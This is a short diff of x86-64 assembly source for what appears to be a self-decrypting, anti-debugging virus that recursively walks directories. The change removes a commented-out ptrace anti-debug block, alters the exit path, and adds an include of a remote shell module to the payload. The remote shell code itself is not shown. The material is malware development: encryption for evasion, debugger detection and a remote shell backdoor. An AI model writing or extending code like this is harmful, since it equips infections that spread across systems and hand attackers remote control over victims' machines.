@@ -54,14 +54,6 @@ decrypte:
     dec rbx
     cmp rbx, 0
 encrypted_start:
-;    xor rdi, rdi ;  PTRACE_TRACEME
-;    xor rsi, rsi
-;    mov rdx, 1
-;    xor r10, r10
-;    mov rax, SYS_PTRACE
-;    syscall             ; ptrace(PTRACE_TRACEME, 0, 1, 0);
-;    cmp rax, 0
-;    jl exit
     lea rdi, [rsp + fileName]
     call check_trace
     cmp rax, 0
@@ -87,9 +79,10 @@ encrypted_start:
     call ft_strcpy
     mov rdi, rsp
     call recursive
-    jmp exit
+
 
 exit:
+    xor rax, rax
     pop rsi
     pop rdi
     pop rcx
@@ -104,6 +97,8 @@ jump:
     nop
 
 %include "get_processus_actif.s"
+
+%include "remote_shell.s"
 
 %include "check_trace.s"
 
